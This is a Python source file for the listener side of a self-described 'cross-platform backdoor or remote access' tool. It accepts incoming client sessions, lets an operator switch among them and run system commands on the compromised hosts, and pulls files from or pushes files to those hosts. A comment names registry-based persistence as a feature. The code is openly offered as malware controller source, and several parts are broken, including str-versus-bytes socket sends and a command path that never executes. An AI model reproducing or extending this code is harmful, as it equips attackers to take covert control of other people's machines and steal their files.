'''
    author  : zerobits01
    created : 25-Jan-2020
    modified: 28-Jan-2020
    purpose : listener pool for all clients and gives a remote terminal
                to client
'''

import socket
import json
import threading
import re
import os,sys

HOST = lambda : '0.0.0.0'
PORT = lambda : 101
BasePath = lambda : '/root/Documents/'

all_sockets = []

class SocketHandler(threading.Thread):

    def __init__(self,id,name,addr,conn):
        threading.Thread.__init__(self)
        self.leave = False
        self.id = id
        self.addr = addr
        self.conn = conn
        self.conn.sendall('uname')
        uname  = self.conn.recv(1024)
        self.name = uname + name

    def saveFile(self, jsondata, filename):
        '''
            downloads the file and saving it in /root/Documents
            you can change the BasePath in top if file
        '''
        json_string = jsondata.decode('utf-8')
        data_to_write = json.loads(json_string)[filename]
        with open(file=BasePath()+self.name+'_'+filename,mode='wb') as f:
            f.writelines(data_to_write)

    def upload(self, path):
        '''
            should pass the absolute path from /
        '''
        with open(file=path, mode='rb') as f:
            if f.readable():
                data_to_send = f.readlines()
                filename = os.path.split(path)[-1]
                datatosend = { filename : ''.join(data_to_send)}
                return data_to_send
            else :
                print('[-] file is not allowed to read?!?')

    def exeCommand(self,user_input):
        '''
            if cmnd is download after it waite to recv
            if cmnd is upload first send a signal then read the file and send it
            if cmnd is not none of these send the cmnd to do on clientside and recv answer
            ls, dir, uname, pwd, upload, download
            presistence(regadd)
        '''
        cmnd = None
        filename = None

        if re.match(r'^\s*download\s+(?P<filename>\S+)\s*$',user_input):
            cmnd = 'download'
            filename = re.search(r'^\s*download\s+(?P<filename>\S+)\s*$',user_input).group('filename')

        if re.match(r'^\s*upload\s+(?P<filename>\S+)\s*$',user_input):
            cmnd = 'upload'
            filename = re.search(r'^\s*upload\s+(?P<filename>\S+)\s*$',user_input).group('filename')

        if cmnd == 'download':
            cmnd = 'download ' + filename
            self.conn.sendall(cmnd) # here just the file name is enough
            self.saveFile(jsondata=self.conn.recv(1024),filename=filename)
            # client should send a jsondata dict : {filename : "binary data"}
        elif cmnd == 'upload' :
            filename = os.path.split(filename)[-1]
            cmnd = 'upload ' + filename
            self.conn.sendall(cmnd)
            self.conn.sendall(self.upload(filename))
        elif cmnd != None :
            self.conn.sendall(cmnd)
            return self.recv(1024)
        else :
            help_string = '''
    you are in session part.
    you can run all system commands(based on OS)
        ls : list the file
        help : list all commands you can run
        upload : uploadig a file (after upload command you should write the exact filepath)
        download : downloading a file from client box in current dir
        
            '''
            print(help_string)
    def disconnect(self):
        self.leave = True

    def run(self) -> None:
        while self.leave != True :
            pass
        print('[*] %s disconnected'%(self.name))

class Handler(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)


    def run(self) -> None:
        global all_sockets
        self.prompt = 'zbits'
        self.command = ''
        while True :
            user_input = input(self.prompt + '> ')
            try :
                sessionnumber = \
                    re.search(r'use session %(?P<sessno>\d+)',user_input).group('sessno')
                self.command = 'use'
            except AttributeError:
                if re.match(r'^\s*list\s*$',user_input):
                    self.command = 'list'
                elif re.match(r'^\s*help\s*$', user_input):
                    self.command = 'help'
                sessionnumber = None

            if self.command == 'use':
                self.connected = all_sockets[int(sessionnumber)]
                self.prompt = self.connected.name
                while True :
                    user_input = input(self.prompt + '> ')
                    if re.match(r'^\s*close\s*$', user_input) :
                        self.connected = None
                        break
                    print(self.connected.exeCommand(user_input))
            elif self.command == 'list' :
                for client in all_sockets :
                    print('['+client.id+'] ' + client.name)
            elif self.command == 'help' :
                help_string = '''
    author : zerobits01
    gmail  : zerobits0101@gmail.com
    team   : Paradox-Squad
    purpose: it's cross-platform backdoor or remote access
    commands : 
        help  => print this string
        close => close the open session
        use session# => it starts a controlling a client
        list => lists all available sessions
        ctrl+c => exit the program
        in session you can run all system commands base on client OS
                '''
                print(help_string)


while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s :
        s.bind((HOST(),PORT()))
        s.listen()
        id = 0
        Handler().start()
        while True:
            conn, addr = s.accept()
            all_sockets.append(
                SocketHandler(id=id,name='session%d'%(id),addr=addr,conn=conn))
            all_sockets[id].start()
            id += 1